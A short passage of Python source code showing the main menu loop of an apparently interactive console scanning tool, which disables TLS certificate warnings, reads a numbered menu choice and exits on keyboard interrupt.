    scan_running = True

    def main():
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        clear_screen()

        while scan_running:
            try:
                display_menu()
                choice = input(f"\n{Fore.CYAN}[?] Select an option (0-6): {Style.RESET_ALL}").strip()
                handle_selection(choice)
            except KeyboardInterrupt:
                print_exit_menu()
                break

    if __name__ == "__main__":
        main()

except KeyboardInterrupt:
    sys.exit()
